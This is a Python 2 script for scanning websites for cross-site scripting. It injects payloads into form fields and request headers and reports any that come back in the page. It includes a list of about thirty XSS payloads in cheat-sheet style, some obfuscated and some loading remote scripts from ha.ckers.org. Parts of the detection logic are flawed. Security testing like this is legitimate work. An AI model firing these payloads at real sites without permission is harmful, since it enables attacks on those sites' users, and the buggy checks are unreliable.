import re
import urllib2
import urllib
import argparse
import datetime
import time
from urlparse import urlparse
from sys import exit
from os import system
import random

print "\t\033[92m*************************************************"
print "\t\033[92m*                   XSS Scanner                 *"
print "\t\033[92m*************************************************"

class Xss(object):
    headers = {
'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1',
        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
        'Referer': '',
        'Accept-Encoding': '',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
    }
    injection = None  # The injection string
    x = False
    total = 0
    vulnerabilities = []  # The vulnerabilities collected
    url = None  # The url

    def __init__(self, url=None, injection=None):
        """ The url must end with '/' """
        if url[-1:] != '/':
            url += '/'
        self.url = url
        self.injection = injection

    def set_url(self, url):
        """ Set the url """
        if url[-1:] != '/':
            url += '/'
        self.url = url

    def set_injection(self, injection):
        """ Set the injection string """
        self.injection = injection

    def full_date(self):
        return datetime.datetime.now()

    def exploit(self):
        """ Start the scan """
        start_time = time.time()
        print self.full_date(), self.url
        print "Scanning headers.."
        self.inject_headers(None)
        print "Scanning forms.."
        self.get_forms()
        print "Results: "
        for vuln in self.vulnerabilities:
            print "URL: %s\r\nMethod: %s\r\n\r\n" % (vuln[0], vuln[1])
            
    def inject_headers(self, headers_to_inject):
        """ Checking for vulnerabilities in headers the headers_to_inject variable is in charge for which headers to check """
        headers = self.headers
        if headers_to_inject is None:
            headers_to_inject = ["Referer", "User-Agent"] # check for header injections
        for header in headers_to_inject:
            temp_value = header
            headers[header] += self.injection
            data = self.http_request(self.url, headers)
            if self.injection in headers:
                self.vulnerabilities.append([self.url, header + " header"])
            self.total += 1
            headers[header] = temp_value

    def get_forms(self):
        """ Extracting the forms from the website """
        data = self.http_request(self.url)
        forms = re.findall(
            """<form.*?action=['|"](.*?)['|"].*?method=['|"](.*?)['|"].*?>(.*?)</form>""", data, re.DOTALL)  # Parse forms
        for form in forms:  # Scan each form
            self.scan(form)

    def scan(self, form):
        """ Gather all the data required and send it to the website """
        inputs = re.findall("""<input.*?name=['|"](.*?)['|"].*?>""", form[
                            2])  # Extract all the required parameters from the webpage
        data = ""
        for input in inputs:
            data += input + "=" + urllib.quote_plus(self.injection) + "&"
        data = data[:-1]
        self.send_payload(self.url, data, form)  # Send the payload
        self.total += 1

    def send_payload(self, url, data, form):
        """ Send the payload to the website """
        temp_url = url
        if form[0][0] == "/":
            temp_url = re.findall(
                "^(http.*?\/\/.*?)/.*$", temp_url)[0] + form[0]
        elif re.search("^http.*?\/\/.*?$", form[0]) is not None:
            temp_url = form[0]
        else:
            temp_url += form[0]
        if form[1] == 'post':
            html = self.http_post(temp_url, data)
        else:
            data = "?" + data
            temp_url += data
            html = self.http_request(temp_url)
        if self.injection in html:
            self.vulnerabilities.append(
                [urllib.unquote(temp_url).replace("+", " "), data, form[1].upper()])
            return True
        else:
            return False

    def http_post(self, url, payload):
        """ This function is used for http post request """
        req = urllib2.Request(url, payload, self.headers)
        response = urllib2.urlopen(req)
        data = response.read()
        response.close()
        return data

    def http_request(self, url, hdrs=None):
        if hdrs is None:
            hdrs = self.headers
        """ This function is used for http get request """
        req = urllib2.Request(url, headers=hdrs)
        request = urllib2.urlopen(req)
        data = request.read()
        request.close()
        return data


def main():
    url = ""
    injections = [
        """<IMG SRC=" &#14;  javascript:alert('XSS');">""",
        """</title>"><iframe onerror="alert(/ABlack/);" src=x></iframe>""",
        """<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvcjR6Lyk8L3NjcmlwdD4=">""",
        """<img src=x onerror=alert(/ABlack/)>""",
        """<scri%00pt>alert(1);</scri%00pt>""",
        """<svg/onload=prompt(1);>""","""<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">""","""<SCRIPT>alert('XSS');</SCRIPT>""","""<SCRIPT>alert('XSS');</SCRIPT>""","""<IMG SRC="javascript:alert('XSS');">""","""<IMG SRC=javascript:alert('XSS')>""","""<IMG SRC=JaVaScRiPt:alert('XSS')>""","""<IMG SRC=javascript:alert(&quot;XSS&quot;)>""","""<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""","""<IMG SRC="jav&#x09;ascript:alert('XSS');">""","""<IMG SRC="jav&#x0A;ascript:alert('XSS');">""","""<IMG SRC="jav&#x0D;ascript:alert('XSS');">""","""<IMG SRC=" &#14;  javascript:alert('XSS');">""","""<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""","""<BODY BACKGROUND="javascript:alert('XSS')">""","""<BODY ONLOAD=alert('XSS')>""","""<IMG DYNSRC="javascript:alert('XSS')">""","""<IMG LOWSRC="javascript:alert('XSS')">""","""<BGSOUND SRC="javascript:alert('XSS');">""","""<BR SIZE="&{alert('XSS')}">""","""<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>""","""<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""","""<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">""","""<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>""","""<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">""","""<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>""",]
    parser = argparse.ArgumentParser(description='XSS Scanner')
    parser.add_argument('-t', '--target', help='The target url', required=True)
    parser.add_argument(
        '-m', '--mass', help='Optional mass scan', required=False)
    args = parser.parse_args()
    the_thing = Xss(args.target, injections[1])
    the_thing.exploit()
if __name__ == "__main__":
    print "Scanning for XSS"
    main()
